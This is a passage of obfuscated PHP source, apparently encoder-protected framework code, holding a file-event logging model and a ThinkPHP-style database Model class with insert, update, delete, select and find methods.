$ÉÒÌÍå[$Åë¼úĞ…[32]], $Åë¼úĞ…[2215] => !empty($ÉÒÌÍå[$Åë¼úĞ…[596]]) ? $ÉÒÌÍå[$Åë¼úĞ…[596]] : $Åë¼úĞ…[12], $Åë¼úĞ…[1257] => $ïÊïá¨÷, $Åë¼úĞ…[2240] => $³¸éÓ±É[$Åë¼úĞ…[32]], $Åë¼úĞ…[2241] => !empty($³¸éÓ±É[$Åë¼úĞ…[596]]) ? $³¸éÓ±É[$Åë¼úĞ…[596]] : $Åë¼úĞ…[12]); $this->addEvent($“î÷öâé, $Åë¼úĞ…[637], $Û©òÂÚÇ); $á•‰ú = $ÈÌø©ƒ->sourceInfo($“î÷öâé); $Û©òÂÚÇ = array($Åë¼úĞ…[194] => $á•‰ú[$Åë¼úĞ…[194]], $Åë¼úĞ…[32] => $á•‰ú[$Åë¼úĞ…[32]]); $this->addEvent($ãíÇÓ©®, $Åë¼úĞ…[2242], $Û©òÂÚÇ); } public function eventCopy($§‹š‘ê) { $this->eventCreate($§‹š‘ê, $_SERVER[´‹ô¯Œ][635]); } public function eventRename($Š•çåâ, $Ò­èÜ³×, $­—ˆ¢–ì) { $ÚÏ—Ñç» =& $_SERVER[´‹ô¯Œ]; $§é•ËÏÅ = array($ÚÏ—Ñç»[1256] => $Ò­èÜ³×, $ÚÏ—Ñç»[1257] => $­—ˆ¢–ì); return $this->addEvent($Š•çåâ, $ÚÏ—Ñç»[1459], $§é•ËÏÅ); } public function eventAddComment($œ†¸æûê, $¹¥€¿•) { return $this->addEvent($œ†¸æûê, $_SERVER[´‹ô¯Œ][2243], $¹¥€¿•); } public function eventAddDesc($Ş¤…´ê, $¶…Ô˜¹Ö) { return $this->addEvent($Ş¤…´ê, $_SERVER[´‹ô¯Œ][2244], $¶…Ô˜¹Ö); } public function listBySource($Ú®‡¾²ó) { $öı–¹Êù =& $_SERVER[´‹ô¯Œ]; $÷Î¬¦Ê« = Model($öı–¹Êù[1445])->sourceInfo($Ú®‡¾²ó); $¢áÚ‹ = array($öı–¹Êù[503] => $Ú®‡¾²ó); if ($÷Î¬¦Ê«[$öı–¹Êù[497]] == $öı–¹Êù[91]) { $­Æ¥ÌÛ = Model($öı–¹Êù[1445])->listSearchChildren($Ú®‡¾²ó, 20000); $­Æ¥ÌÛ[] = $Ú®‡¾²ó . $öı–¹Êù[457]; $¢áÚ‹ = array($öı–¹Êù[194] => array($öı–¹Êù[7], $­Æ¥ÌÛ)); } $Âä¶ß› = $this->where($¢áÚ‹)->order($öı–¹Êù[2245])->selectPage(); if ($Âä¶ß›[$öı–¹Êù[445]][$öı–¹Êù[446]] == 0) { $Âä¶ß›[$öı–¹Êù[445]][$öı–¹Êù[446]] = 1; $Âä¶ß›[$öı–¹Êù[448]] = array(array($öı–¹Êù[503] => $Ú®‡¾²ó, $öı–¹Êù[2225] => $÷Î¬¦Ê«[$öı–¹Êù[193]], $öı–¹Êù[1787] => $÷Î¬¦Ê«[$öı–¹Êù[539]], $öı–¹Êù[508] => $öı–¹Êù[2246], $öı–¹Êù[509] => $÷Î¬¦Ê«[$öı–¹Êù[234]], $öı–¹Êù[1789] => $öı–¹Êù[12])); } return $this->eventListParse($Âä¶ß›, $Ú®‡¾²ó); } private function eventListParse($Ö—Òş„, $¹ÎîÏ) { $µ¾¨Â³Ş =& $_SERVER[´‹ô¯Œ]; $øÊ§«» = $Ö—Òş„[$µ¾¨Â³Ş[448]]; $†ÜÌºó¦ = array_to_keyvalue($øÊ§«», $µ¾¨Â³Ş[12], $µ¾¨Â³Ş[194]); $Äœ–õÏ = array_to_keyvalue($øÊ§«», $µ¾¨Â³Ş[12], $µ¾¨Â³Ş[2231]); foreach ($øÊ§«» as $à×«¶Õ¶) { $§à‰ÖŞÓ = $à×«¶Õ¶[$µ¾¨Â³Ş[538]]; if ($à×«¶Õ¶[$µ¾¨Â³Ş[33]] == $µ¾¨Â³Ş[637] && isset($§à‰ÖŞÓ[$µ¾¨Â³Ş[1256]])) { $†ÜÌºó¦[] = $§à‰ÖŞÓ[$µ¾¨Â³Ş[1256]] . $µ¾¨Â³Ş[12]; $†ÜÌºó¦[] = $§à‰ÖŞÓ[$µ¾¨Â³Ş[1257]] . $µ¾¨Â³Ş[12]; } if ($à×«¶Õ¶[$µ¾¨Â³Ş[33]] == $µ¾¨Â³Ş[2242] && isset($§à‰ÖŞÓ[$µ¾¨Â³Ş[194]])) { $†ÜÌºó¦[] = $§à‰ÖŞÓ[$µ¾¨Â³Ş[194]] . $µ¾¨Â³Ş[12]; } } $†ÜÌºó¦ = array_merge($†ÜÌºó¦, $Äœ–õÏ, array($¹ÎîÏ . $µ¾¨Â³Ş[12])); $†ÜÌºó¦ = array_unique($†ÜÌºó¦); $­ì±·ù– = array_unique(array_to_keyvalue($øÊ§«», $µ¾¨Â³Ş[12], $µ¾¨Â³Ş[1796])); $–÷…ÇñŠ = Model($µ¾¨Â³Ş[611])->userListInfo($­ì±·ù–); $ÙÑã±İ = Model($µ¾¨Â³Ş[916])->sourceListInfo($†ÜÌºó¦, !0); foreach ($øÊ§«» as &$à×«¶Õ¶) { if ($à×«¶Õ¶[$µ¾¨Â³Ş[33]] == $µ¾¨Â³Ş[637] && isset($à×«¶Õ¶[$µ¾¨Â³Ş[538]][$µ¾¨Â³Ş[1256]])) { $à×«¶Õ¶[$µ¾¨Â³Ş[538]][$µ¾¨Â³Ş[1256]] = $ÙÑã±İ[$à×«¶Õ¶[$µ¾¨Â³Ş[538]][$µ¾¨Â³Ş[1256]]]; $à×«¶Õ¶[$µ¾¨Â³Ş[538]][$µ¾¨Â³Ş[1257]] = $ÙÑã±İ[$à×«¶Õ¶[$µ¾¨Â³Ş[538]][$µ¾¨Â³Ş[1257]]]; } if ($à×«¶Õ¶[$µ¾¨Â³Ş[33]] == $µ¾¨Â³Ş[2242] && isset($à×«¶Õ¶[$µ¾¨Â³Ş[538]][$µ¾¨Â³Ş[194]])) { $à×«¶Õ¶[$µ¾¨Â³Ş[538]][$µ¾¨Â³Ş[194]] = $ÙÑã±İ[$à×«¶Õ¶[$µ¾¨Â³Ş[538]][$µ¾¨Â³Ş[194]]]; } $à×«¶Õ¶[$µ¾¨Â³Ş[90]] = $ÙÑã±İ[$à×«¶Õ¶[$µ¾¨Â³Ş[194]]]; $à×«¶Õ¶[$µ¾¨Â³Ş[2247]] = $ÙÑã±İ[$à×«¶Õ¶[$µ¾¨Â³Ş[2231]]]; if ($à×«¶Õ¶[$µ¾¨Â³Ş[33]] == $µ¾¨Â³Ş[1965]) { $à×«¶Õ¶[$µ¾¨Â³Ş[2247]] = $à×«¶Õ¶[$µ¾¨Â³Ş[90]]; $à×«¶Õ¶[$µ¾¨Â³Ş[2231]] = $à×«¶Õ¶[$µ¾¨Â³Ş[2247]][$µ¾¨Â³Ş[194]]; $à×«¶Õ¶[$µ¾¨Â³Ş[90]] = !1; $à×«¶Õ¶[$µ¾¨Â³Ş[194]] = $µ¾¨Â³Ş[12]; } $à×«¶Õ¶[$µ¾¨Â³Ş[2176]] = $–÷…ÇñŠ[$à×«¶Õ¶[$µ¾¨Â³Ş[1796]]]; } unset($à×«¶Õ¶); $Ö—Òş„[$µ¾¨Â³Ş[448]] = $øÊ§«»; return $Ö—Òş„; } public function removeBySource($Šş‡–ÕØ) { $Å…‹¶£ = array($_SERVER[´‹ô¯Œ][503] => $Šş‡–ÕØ); $this->where($Å…‹¶£)->remove(); } } goto dÀñÖ¶âö¢; AÎ£®ŒË: define($_SERVER[´‹ô¯Œ][323], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\x65", "\157\162\144\x65\x72", "\141\x6c\x69\141\163", "\x68\x61\x76\x69\156\147", "\147\162\157\x75\x70", "\x6c\x6f\143\153", "\x64\x69\x73\164\151\156\143\164", "\141\x75\x74\157", "\146\151\x6c\x74\x65\162", "\x76\141\154\151\x64\141\164\145", "\162\x65\x73\x75\154\x74", "\142\x69\156\x64", "\x74\157\153\145\156"); public function __construct($Ç¶Ïáî¿ = '', $Õƒ„¤ = '', $š¼•‡•÷ = '') { $‘ŞÄ®Éâ =& $_SERVER[´‹ô¯Œ]; $this->_initialize(); if (!empty($Ç¶Ïáî¿)) { if (strpos($Ç¶Ïáî¿, $‘ŞÄ®Éâ[10])) { list($this->dbName, $this->name) = explode($‘ŞÄ®Éâ[10], $Ç¶Ïáî¿); } else { $this->name = $Ç¶Ïáî¿; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Õƒ„¤)) { $this->tablePrefix = $‘ŞÄ®Éâ[12]; } elseif ($‘ŞÄ®Éâ[12] != $Õƒ„¤) { $this->tablePrefix = $Õƒ„¤; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($‘ŞÄ®Éâ[324]); } $this->db(0, empty($this->connection) ? $š¼•‡•÷ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $¬Ğ«ÂÃš =& $_SERVER[´‹ô¯Œ]; if (empty($this->fields)) { if (think_config($¬Ğ«ÂÃš[325])) { $ßĞÏ’Óõ = $this->dbName ? $this->dbName : think_config($¬Ğ«ÂÃš[326]); $²×øĞ§Ğ = think_var_cache($¬Ğ«ÂÃš[327] . strtolower(get_path_this($ßĞÏ’Óõ) . $¬Ğ«ÂÃš[10] . $this->name)); if ($²×øĞ§Ğ) { $‡ğğ³œö = think_config($¬Ğ«ÂÃš[328]); if (empty($‡ğğ³œö) || $²×øĞ§Ğ[$¬Ğ«ÂÃš[329]] == $‡ğğ³œö) { $this->fields = $²×øĞ§Ğ; return; } } } $this->flush(); } } public function flush() { $ÉÏ«»ë =& $_SERVER[´‹ô¯Œ]; $this->db->setModel($this->name); $„‹êé„ = $this->db->getFields($this->getTableName()); if (!$„‹êé„) { return !1; } $this->fields = array_keys($„‹êé„); $this->fields[$ÉÏ«»ë[330]] = !1; foreach ($„‹êé„ as $Çôûß¯ => $ùĞÕèÏ) { $‘»ºú¹µ[$Çôûß¯] = $ùĞÕèÏ[$ÉÏ«»ë[33]]; if ($ùĞÕèÏ[$ÉÏ«»ë[39]]) { $this->fields[$ÉÏ«»ë[331]] = $Çôûß¯; if ($ùĞÕèÏ[$ÉÏ«»ë[42]]) { $this->fields[$ÉÏ«»ë[330]] = !0; } } } $this->fields[$ÉÏ«»ë[332]] = $‘»ºú¹µ; if (think_config($ÉÏ«»ë[328])) { $this->fields[$ÉÏ«»ë[329]] = think_config($ÉÏ«»ë[328]); } if (think_config($ÉÏ«»ë[325])) { $“Ğ™êÎã = $this->dbName ? $this->dbName : think_config($ÉÏ«»ë[326]); think_var_cache($ÉÏ«»ë[327] . strtolower(get_path_this($“Ğ™êÎã) . $ÉÏ«»ë[10] . $this->name), $this->fields); } } public function switchModel($°Ş»¶¹È, $Â™±ˆÄ = array()) { $’¹Øş­¿ =& $_SERVER[´‹ô¯Œ]; $ìÂ¾À—½ = ucwords(strtolower($°Ş»¶¹È)) . $’¹Øş­¿[333]; if (!class_exists($ìÂ¾À—½)) { think_exception($ìÂ¾À—½ . think_lang($’¹Øş­¿[334])); } $this->_extModel = new $ìÂ¾À—½($this->name); if (!empty($Â™±ˆÄ)) { foreach ($Â™±ˆÄ as $Ï¯÷ÃÈŒ) { $this->_extModel->setProperty($Ï¯÷ÃÈŒ, $this->{$Ï¯÷ÃÈŒ}); } } return $this->_extModel; } public function __set($©ÁàğÛ, $åà©ËÈû) { $this->data[$©ÁàğÛ] = $åà©ËÈû; } public function __get($ùÄäë‘Š) { return isset($this->data[$ùÄäë‘Š]) ? $this->data[$ùÄäë‘Š] : null; } public function __isset($Ë—Á§ü‡) { return isset($this->data[$Ë—Á§ü‡]); } public function __unset($ªÕêºú) { unset($this->data[$ªÕêºú]); } public function __call($ ©‘Òí, $¦–‡§¾·) { $‘ëáØ¡ë =& $_SERVER[´‹ô¯Œ]; if (in_array(strtolower($ ©‘Òí), $this->methods, !0)) { $this->options[strtolower($ ©‘Òí)] = $¦–‡§¾·[0]; return $this; } elseif (in_array(strtolower($ ©‘Òí), array($‘ëáØ¡ë[335], $‘ëáØ¡ë[336], $‘ëáØ¡ë[337], $‘ëáØ¡ë[338], $‘ëáØ¡ë[339]), !0)) { $øìšõ½  = isset($¦–‡§¾·[0]) ? $¦–‡§¾·[0] : $‘ëáØ¡ë[223]; $øìšõ½  = $this->db->parseKey($øìšõ½ ); return $this->getField(strtoupper($ ©‘Òí) . $‘ëáØ¡ë[340] . $øìšõ½  . $‘ëáØ¡ë[341] . $ ©‘Òí, $‘ëáØ¡ë[335]); } elseif (strtolower(substr($ ©‘Òí, 0, 5)) == $‘ëáØ¡ë[342]) { $øìšõ½  = think_parse_name(substr($ ©‘Òí, 5)); $‘‡¡­Õ‰[$øìšõ½ ] = $¦–‡§¾·[0]; return $this->where($‘‡¡­Õ‰)->find(); } elseif (strtolower(substr($ ©‘Òí, 0, 10)) == $‘ëáØ¡ë[343]) { $œ›ş¬ï = think_parse_name(substr($ ©‘Òí, 10)); $‘‡¡­Õ‰[$œ›ş¬ï] = $¦–‡§¾·[0]; return $this->where($‘‡¡­Õ‰)->getField($¦–‡§¾·[1]); } elseif (isset($this->_scope[$ ©‘Òí])) { return $this->scope($ ©‘Òí, $¦–‡§¾·[0]); } elseif (method_exists($this, $ ©‘Òí)) { array_unshift($¦–‡§¾·, $ ©‘Òí); return call_user_func_array(array($this, $‘ëáØ¡ë[344]), $¦–‡§¾·); } else { return call_user_func_array(array(parent, $ ©‘Òí), $¦–‡§¾·); } } protected function call() { $İÌ™¸ ş =& $_SERVER[´‹ô¯Œ]; $¼ŞÂ—®ƒ = func_get_args(); $³Æ‘ûñÖ = array_shift($¼ŞÂ—®ƒ); $…ÙáÂ˜ó = $³Æ‘ûñÖ; if (is_array($³Æ‘ûñÖ)) { $…ÙáÂ˜ó = $³Æ‘ûñÖ[1]; $³Æ‘ûñÖ = $³Æ‘ûñÖ[0]; } $‚—–¿ÄÄ = count($¼ŞÂ—®ƒ) - 1; if (isset($¼ŞÂ—®ƒ[$‚—–¿ÄÄ]) && $¼ŞÂ—®ƒ[$‚—–¿ÄÄ] === $³Æ‘ûñÖ) { think_exception(__CLASS__ . $İÌ™¸ ş[4] . $³Æ‘ûñÖ . think_lang($İÌ™¸ ş[345])); return; } $¼ŞÂ—®ƒ[] = $³Æ‘ûñÖ; if (method_exists($this, $İÌ™¸ ş[346])) { $Áú¿ÛåÖ = call_user_func_array(array($this, $İÌ™¸ ş[347]), array($…ÙáÂ˜ó, $¼ŞÂ—®ƒ)); if (!is_null($Áú¿ÛåÖ) && $Áú¿ÛåÖ !== !1) { return $Áú¿ÛåÖ; } } $áÃ˜ïŒ = call_user_func_array(array($this, $³Æ‘ûñÖ), $¼ŞÂ—®ƒ); if (method_exists($this, $İÌ™¸ ş[348])) { $Áú¿ÛåÖ = call_user_func_array(array($this, $İÌ™¸ ş[349]), array($…ÙáÂ˜ó, $¼ŞÂ—®ƒ, $áÃ˜ïŒ)); if ($Áú¿ÛåÖ) { return $Áú¿ÛåÖ; } } return $áÃ˜ïŒ; } protected function _initialize() { } protected function _facade($ïú„ıØŸ) { $“ôŞ±£í =& $_SERVER[´‹ô¯Œ]; if (!empty($this->fields)) { foreach ($ïú„ıØŸ as $Œº«¹ => $ˆÈÑí) { if (is_array($this->fields) && !in_array($Œº«¹, $this->fields, !0)) { unset($ïú„ıØŸ[$Œº«¹]); } elseif (is_scalar($ˆÈÑí)) { $this->_parseType($ïú„ıØŸ, $Œº«¹); } } } if (!empty($this->options[$“ôŞ±£í[350]])) { $ïú„ıØŸ = array_map($this->options[$“ôŞ±£í[350]], $ïú„ıØŸ); unset($this->options[$“ôŞ±£í[350]]); } $this->_beforeWrite($ïú„ıØŸ); return $ïú„ıØŸ; } protected function _beforeWrite(&$€ëïÅ¤) { } public function add($Ç´š¯©ß = '', $—™îüûŒ = array(), $øºü…ÜĞ = false) { if (empty($Ç´š¯©ß)) { if (!empty($this->data)) { $Ç´š¯©ß = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[´‹ô¯Œ][351]); return !1; } } $—™îüûŒ = $this->_parseOptions($—™îüûŒ); $Ç´š¯©ß = $this->_facade($Ç´š¯©ß); if (!1 === $this->_beforeInsert($Ç´š¯©ß, $—™îüûŒ)) { return !1; } $±˜æş’™ = $this->db->insert($Ç´š¯©ß, $—™îüûŒ, $øºü…ÜĞ); if (!1 !== $±˜æş’™) { $œ„šÖÛû = $this->getLastInsID(); if ($œ„šÖÛû) { $Ç´š¯©ß[$this->getPk()] = $œ„šÖÛû; $this->_after_insert($Ç´š¯©ß, $—™îüûŒ); return $œ„šÖÛû; } $this->_after_insert($Ç´š¯©ß, $—™îüûŒ); } return $±˜æş’™; } protected function _beforeInsert(&$‡¬öÃòñ, $ª¯öåÕÄ) { } protected function _after_insert($£ü×‘ò‹, $Œ—“©õ) { } public function addAll($÷ƒÂå€, $îñ¸œÄ = array(), $¼‘÷«Ã˜ = false) { $ÓôÂ¶¢Ó =& $_SERVER[´‹ô¯Œ]; if (empty($÷ƒÂå€)) { $this->error = think_lang($ÓôÂ¶¢Ó[351]); return !1; } $îñ¸œÄ = $this->_parseOptions($îñ¸œÄ); foreach ($÷ƒÂå€ as $Œ”î¢­è => $Âø™ôÖÇ) { $÷ƒÂå€[$Œ”î¢­è] = $this->_facade($Âø™ôÖÇ); } if (method_exists($this->db, $ÓôÂ¶¢Ó[352])) { $¥ÉñŠÈ÷ = $this->db->insertAll($÷ƒÂå€, $îñ¸œÄ, $¼‘÷«Ã˜); } else { $this->startTrans(); foreach ($÷ƒÂå€ as $Œ”î¢­è => $Âø™ôÖÇ) { $¥ÉñŠÈ÷ = $this->db->insert($Âø™ôÖÇ, $îñ¸œÄ, $¼‘÷«Ã˜); } $this->commit(); } if (!1 !== $¥ÉñŠÈ÷) { $¬ã„½ïØ = $this->getLastInsID(); if ($¬ã„½ïØ) { return $¬ã„½ïØ; } } return $¥ÉñŠÈ÷; } public function selectAdd($û¾¿‚Áí = '', $šÕä„¶ã = '', $ÂœÜÕêò = array()) { $˜—¡òÅ =& $_SERVER[´‹ô¯Œ]; $ÂœÜÕêò = $this->_parseOptions($ÂœÜÕêò); if (!1 === ($ûá­êí = $this->db->selectInsert($û¾¿‚Áí ? $û¾¿‚Áí : $ÂœÜÕêò[$˜—¡òÅ[353]], $šÕä„¶ã ? $šÕä„¶ã : $this->getTableName(), $ÂœÜÕêò))) { $this->error = think_lang($˜—¡òÅ[354]); return !1; } else { return $ûá­êí; } } public function save($şª†›ö² = '', $çã’çš = array()) { $³ßËëì° =& $_SERVER[´‹ô¯Œ]; if (empty($şª†›ö²)) { if (!empty($this->data)) { $şª†›ö² = $this->data; $this->data = array(); } else { $this->error = think_lang($³ßËëì°[351]); return !1; } } $şª†›ö² = $this->_facade($şª†›ö²); $çã’çš = $this->_parseOptions($çã’çš); $æşé ôÜ = $this->getPk(); if (!isset($çã’çš[$³ßËëì°[355]])) { if (isset($şª†›ö²[$æşé ôÜ])) { $…ñôÍü‡[$æşé ôÜ] = $şª†›ö²[$æşé ôÜ]; $çã’çš[$³ßËëì°[355]] = $…ñôÍü‡; unset($şª†›ö²[$æşé ôÜ]); } else { $this->error = think_lang($³ßËëì°[354]); return !1; } } if (is_array($çã’çš[$³ßËëì°[355]]) && isset($çã’çš[$³ßËëì°[355]][$æşé ôÜ])) { $¨şÅ«Ô¡ = $çã’çš[$³ßËëì°[355]][$æşé ôÜ]; } if (!1 === $this->_beforeUpdate($şª†›ö², $çã’çš)) { return !1; } $ŸâÄù¿¡ = $this->db->update($şª†›ö², $çã’çš); if (!1 !== $ŸâÄù¿¡) { if (isset($¨şÅ«Ô¡)) { $şª†›ö²[$æşé ôÜ] = $¨şÅ«Ô¡; } $this->_afterUpdate($şª†›ö², $çã’çš); } return $ŸâÄù¿¡; } protected function _beforeUpdate(&$’İÜà¾, $Ù¡—˜†) { } protected function _afterUpdate($¥˜Äê‰‘, $î¡£ÜÜ½) { } public function delete($–ü»”Ì® = array()) { $¨Œ“¿íú =& $_SERVER[´‹ô¯Œ]; if (empty($–ü»”Ì®) && empty($this->options[$¨Œ“¿íú[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $»¢èÌ’ = $this->getPk(); if (is_numeric($–ü»”Ì®) || is_string($–ü»”Ì®)) { if (strpos($–ü»”Ì®, $¨Œ“¿íú[50])) { $ÂÔ€ãáö[$»¢èÌ’] = array($¨Œ“¿íú[356], $–ü»”Ì®); } else { $ÂÔ€ãáö[$»¢èÌ’] = $–ü»”Ì®; } $this->options[$¨Œ“¿íú[355]] = $ÂÔ€ãáö; } $–ü»”Ì® = $this->_parseOptions(); if (is_array($–ü»”Ì®[$¨Œ“¿íú[355]]) && isset($–ü»”Ì®[$¨Œ“¿íú[355]][$»¢èÌ’])) { $ú¤¶†Ó» = $–ü»”Ì®[$¨Œ“¿íú[355]][$»¢èÌ’]; } $Ã¥«ıù = $this->db->delete($–ü»”Ì®); if (!1 !== $Ã¥«ıù) { $¨şß€£É = array(); if (isset($ú¤¶†Ó»)) { $¨şß€£É[$»¢èÌ’] = $ú¤¶†Ó»; } $this->_after_delete($¨şß€£É, $–ü»”Ì®); } return $Ã¥«ıù; } protected function _after_delete($ùŒ’º¹Ü, $–şµúê·) { } public function select($ùûÌ²Š¯ = array()) { $ì·Û±ú =& $_SERVER[´‹ô¯Œ]; if (is_string($ùûÌ²Š¯) || is_numeric($ùûÌ²Š¯)) { $šˆÂÜ’² = $this->getPk(); if (strpos($ùûÌ²Š¯, $ì·Û±ú[50])) { $ñğ¼»¹é[$šˆÂÜ’²] = array($ì·Û±ú[356], $ùûÌ²Š¯); } else { $ñğ¼»¹é[$šˆÂÜ’²] = $ùûÌ²Š¯; } $this->options[$ì·Û±ú[355]] = $ñğ¼»¹é; } elseif (!1 === $ùûÌ²Š¯) { $ùûÌ²Š¯ = $this->_parseOptions(); return $ì·Û±ú[357] . $this->db->buildSelectSql($ùûÌ²Š¯) . $ì·Û±ú[358]; } $ùûÌ²Š¯ = $this->_parseOptions(); $£áä™¿„ = $this->db->select($ùûÌ²Š¯); if (!1 === $£áä™¿„) { return !1; } if (empty($£áä™¿„)) { return null; } $this->_afterSelect($£áä™¿„, $ùûÌ²Š¯); return $£áä™¿„; } protected function _afterSelect(&$¼šÎ³ª, $ª´ë´Ôñ) { } public function buildSql($õ±¬ª“” = array()) { $È¼õÙıá =& $_SERVER[´‹ô¯Œ]; $õ±¬ª“” = $this->_parseOptions($õ±¬ª“”); return $È¼õÙıá[357] . $this->db->buildSelectSql($õ±¬ª“”) . $È¼õÙıá[358]; } public function optionsValue($éØ øÄÚ = null) { if (is_null($éØ øÄÚ)) { return $this->options; } elseif (is_array($éØ øÄÚ)) { $this->options = array_merge($this->options, $éØ øÄÚ); } } protected function _parseOptions($ÂË­‹Â = array()) { $ã „Ïğ =& $_SERVER[´‹ô¯Œ]; if (is_array($ÂË­‹Â)) { $ÂË­‹Â = array_merge($this->options, $ÂË­‹Â); } $this->options = array(); if (!isset($ÂË­‹Â[$ã „Ïğ[359]])) { $ÂË­‹Â[$ã „Ïğ[359]] = $this->getTableName(); $£‰íä× = $this->fields; } else { $£‰íä× = $this->getDbFields(); } if (!empty($ÂË­‹Â[$ã „Ïğ[360]])) { $ÂË­‹Â[$ã „Ïğ[359]] .= $ã „Ïğ[53] . $ÂË­‹Â[$ã „Ïğ[360]]; } $ÂË­‹Â[$ã „Ïğ[361]] = $this->name; if (isset($ÂË­‹Â[$ã „Ïğ[355]]) && is_array($ÂË­‹Â[$ã „Ïğ[355]]) && !empty($£‰íä×) && !isset($ÂË­‹Â[$ã „Ïğ[362]]) && !isset($ÂË­‹Â[$ã „Ïğ[359]])) { foreach ($ÂË­‹Â[$ã „Ïğ[355]] as $®¾´ÏÛ => $©âß÷›Ÿ) { $®¾´ÏÛ = trim($®¾´ÏÛ); if (in_array($®¾´ÏÛ, $£‰íä×, !0)) { if (is_scalar($©âß÷›Ÿ)) { $this->_parseType($ÂË­‹Â[$ã „Ïğ[355]], $®¾´ÏÛ); } } elseif (!is_numeric($®¾´ÏÛ) && $ã „Ïğ[11] != substr($®¾´ÏÛ, 0, 1) && !1 === strpos($®¾´ÏÛ, $ã „Ïğ[10]) && !1 === strpos($®¾´ÏÛ, $ã „Ïğ[340]) && !1 === strpos($®¾´ÏÛ, $ã „Ïğ[215]) && !1 === strpos($®¾´ÏÛ, $ã „Ïğ[287])) { unset($ÂË­‹Â[$ã „Ïğ[355]][$®¾´ÏÛ]); } } } $this->_options_filter($ÂË­‹Â); return $ÂË­‹Â; } protected function _options_filter(&$¥²™Ü“Ù) { } protected function _parseType(&$¥ºÆÊœ—, $²ÓğÀƒë) { $­ûõ†ÆÆ =& $_SERVER[´‹ô¯Œ]; if (empty($this->options[$­ûõ†ÆÆ[363]][$­ûõ†ÆÆ[4] . $²ÓğÀƒë])) { $°Ú‘Ïº× = strtolower($this->fields[$­ûõ†ÆÆ[332]][$²ÓğÀƒë]); if (!1 !== strpos($°Ú‘Ïº×, $­ûõ†ÆÆ[364])) { } elseif (!1 === strpos($°Ú‘Ïº×, $­ûõ†ÆÆ[365]) && !1 !== strpos($°Ú‘Ïº×, $­ûõ†ÆÆ[366])) { $¥ºÆÊœ—[$²ÓğÀƒë] = intval($¥ºÆÊœ—[$²ÓğÀƒë]); } elseif (!1 !== strpos($°Ú‘Ïº×, $­ûõ†ÆÆ[367]) || !1 !== strpos($°Ú‘Ïº×, $­ûõ†ÆÆ[368])) { $¥ºÆÊœ—[$²ÓğÀƒë] = floatval($¥ºÆÊœ—[$²ÓğÀƒë]); } elseif (!1 !== strpos($°Ú‘Ïº×, $­ûõ†ÆÆ[369])) { $¥ºÆÊœ—[$²ÓğÀƒë] = (bool) $¥ºÆÊœ—[$²ÓğÀƒë]; } } } public function find($ï“íÉ = array()) { $Ö¸¾‡Æ¡ =& $_SERVER[´‹ô¯Œ]; if (is_numeric($ï“íÉ) || is_string($ï“íÉ)) { $Ô‰öĞôŠ[$this->getPk()] = intval($ï“íÉ); $this->options[$Ö¸¾‡Æ¡[355]] = $Ô‰öĞôŠ; } $this->options[$Ö¸¾‡Æ¡[370]] = 1; $ï“íÉ = $this->_parseOptions(); $ê½œõ„ = $this->db->select($ï“íÉ); if (!1 === $ê½œõ„) { return !1; } if (empty($ê½œõ„)) { return null; } $this->data = $ê½œõ„[0]; $this->_afterFind($this->data, $ï“íÉ); if (!empty($this->options[$Ö¸¾‡Æ¡[371]])) { return $this->returnResult($this->data, $this->options[$Ö¸¾‡Æ¡[371]]); } return $this->data; } protected function _afterFind(&$´åäè³Ô, $Ë‰¸Áìá) { } protected function returnResult($É§æô©©, $×äÓä±ı = '') { $åĞô¸×ó =& $_SERVER[´‹ô¯Œ]; if ($×äÓä±ı) { if (is_callable($×äÓä±ı)) { return call_user_func($×äÓä±ı, $É§æô©©); } switch (strtolower($×äÓä±ı)) { case $åĞô¸×ó[372]: return json_encode($É§æô©©); case $åĞô¸×ó[373]: return xml_encode($É§æô©©); } } return $É§æô©©; } public function parseFieldsMap($ø¼æÌÁ¤, $Â‹’¬’Ù = 1) { if (!empty($this->_map)) { foreach ($this->_map as $şÑú ÷ => $À‚ãÌØ) { if ($Â‹’¬’Ù == 1) { if (isset($ø¼æÌÁ¤[$À‚ãÌØ])) { $ø¼æÌÁ¤[$şÑú ÷] = $ø¼æÌÁ¤[$À‚ãÌØ]; unset($ø¼æÌÁ¤[$À‚ãÌØ]); } } else { if (isset($ø¼æÌÁ¤[$şÑú ÷])) { $ø¼æÌÁ¤[$À‚ãÌØ] = $ø¼æÌÁ¤[$şÑú ÷]; unset($ø¼æÌÁ¤[$şÑú ÷]); } } } } return $ø¼æÌÁ¤; } public function setField($ƒª¸Ş­, $—ø¿ŒüØ = '') { if (is_array($ƒª¸Ş­)) { $ìòÍ¸³ò = $ƒª¸Ş­; } else { $ìòÍ¸³ò[$ƒª¸Ş­] = $—ø¿ŒüØ; } return $this->save($ìòÍ¸³ò); } public function setAdd($Ç¼ÒÜù, $”ó´’Ê = 1) { $§²¶ß¸â =& $_SERVER[´‹ô¯Œ]; $¤´›‚Õš = $Ç¼ÒÜù . $§²¶ß¸â[374] . $”ó´’Ê; if ($”ó´’Ê < 0) { $¤´›‚Õš = $Ç¼ÒÜù . $”ó´’Ê; } return $this->setField($Ç¼ÒÜù, array($§²¶ß¸â[375], $¤´›‚Õš)); } public function getField($°³µæÃ™, $àÙ áÇÈ = null) { $¡¹‹ï›À =& $_SERVER[´‹ô¯Œ]; $Ñ¢ôÙàõ[$¡¹‹ï›À[353]] = $°³µæÃ™; $Ñ¢ôÙàõ = $this->_parseOptions($Ñ¢ôÙàõ); $°³µæÃ™ = trim($°³µæÃ™); if (strpos($°³µæÃ™, $¡¹‹ï›À[50])) { if (!isset($Ñ¢ôÙàõ[$¡¹‹ï›À[370]])) { $Ñ¢ôÙàõ[$¡¹‹ï›À[370]] = is_numeric($àÙ áÇÈ) ? $àÙ áÇÈ : $¡¹‹ï›À[12]; } $Ùá–·Œ = $this->db->select($Ñ¢ôÙàõ); if (!empty($Ùá–·Œ)) { $÷ó“¬© = explode($¡¹‹ï›À[50], 